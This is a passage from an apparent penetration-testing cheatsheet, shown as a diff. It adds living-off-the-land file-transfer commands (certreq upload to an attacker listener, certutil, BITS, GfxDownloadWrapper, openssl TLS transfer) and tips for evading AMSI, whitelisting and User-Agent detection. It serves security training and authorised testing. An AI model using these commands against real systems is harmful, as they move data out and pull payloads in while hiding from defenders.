+- Use binaries already present on the target for download, upload, command execution, file read/write, and AV/AMSI bypasses — nothing new to drop on disk.
+- Windows: certreq.exe `-Post` upload, certutil.exe download, BITS (`bitsadmin` / `Start-BitsTransfer`) download.
+- Linux: openssl `s_server`/`s_client` "nc style" download — TLS-encrypted in transit, unlike raw netcat (4.5.8).
+
+**Parameters**
+
+- `certreq.exe -Post -config http://<IP>:8000/ <FILE>` — POSTs the file's contents to the URL; the attacker's listener sees it as the request body.
+- `certutil.exe -urlcache -split -f <URL>` — Downloads a file to the current directory.
+- `bitsadmin /transfer <NAME> /priority foreground <URL> <OUT>` — BITS download over HTTP or SMB shares.
+- `Start-BitsTransfer -Source <URL> -Destination <OUT>` — PowerShell BITS wrapper; supports credentials and proxy servers.
+- `GfxDownloadWrapper.exe <URL> <OUT>` — Intel GPU driver downloader (present on some Win10 systems); may be whitelisted, so it evades app-whitelisting and alerting.
+- `openssl s_server -quiet -accept <PORT> -cert certificate.pem -key key.pem < <FILE>` — Serves a file over TLS.
+- `openssl s_client -connect <IP>:<PORT> -quiet > <FILE>` — Pulls a file over TLS.
+
+**Notes**
+
+- Search filters: LOLBAS `/download` `/upload`; GTFOBins `+file download` `+file upload`.
+- certreq `-Post` is not present in all Windows versions; certutil download usage is flagged by AMSI.
+- BITS "intelligently" throttles to minimize impact on foreground work, so transfers may be slow.
+- If PowerShell/Netcat are blocked by application whitelisting or flagged by command-line logging, a LoL bin may be permitted and unalerted — audit the environment (LOLBAS `/download`, GTFOBins `+file download`) for a suitable download binary.
+- Consider changing the HTTP User-Agent to a browser string to evade UA-based detection (see 4.5.2 and blue-team-methodology.md 8.3).
+- GTFOBins/LOLBAS also document execution, file read/write, and bypass primitives beyond transfers — see 8.3 (Privesc Resources) and 9 (Useful Resources) for the links.
 
 </details>
 
@@ -3790,3 +4146,5 @@ for level, ctype, cdata in ancdata:
 | [GrayHatWarfare](https://grayhatwarfare.com/) | Search engine for exposed AWS, Azure, and GCP cloud storage buckets; sort/filter by file format |
 | [PJPT Notes](https://github.com/G0urmetD/PJPT-Notes) | TCM Security PJPT course notes — AD, pentest methodology, privesc |
 | [CPTS Cheatsheet](https://github.com/zagnox/CPTS-cheatsheet) | HTB CPTS exam cheatsheet |
+| [GTFOBins](https://gtfobins.github.io/) | Abusable Unix binaries — file download/upload, execution, file read/write, bypasses |
+| [LOLBAS](https://lolbas-project.github.io/) | Living-off-the-land Windows binaries — same functions, per-binary |
